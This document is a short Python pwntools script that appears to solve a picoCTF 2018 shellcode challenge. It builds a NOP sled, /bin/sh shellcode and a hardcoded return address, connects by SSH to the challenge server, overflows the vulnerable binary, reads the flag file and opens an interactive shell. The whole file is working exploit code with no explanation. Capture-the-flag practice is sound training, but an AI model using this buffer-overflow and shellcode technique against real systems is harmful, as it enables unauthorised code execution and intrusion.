#!/usr/bin/python

from pwn import *

PADDING = 164

payload = asm(shellcraft.sh())
nopsled = '\x90' * (PADDING - len(payload))
stackAddr = p32(0xffffd22c)

exploit = nopsled + payload + stackAddr

s = ssh(host='2018shell1.picoctf.com', user='Platy')

py = s.run('cd /problems/shellcode_0_48532ce5a1829a772b64e4da6fa58eed; ./vuln')
print py.recv()
py.sendline(exploit)
py.sendline('cat flag.txt')
py.interactive()
s.close()
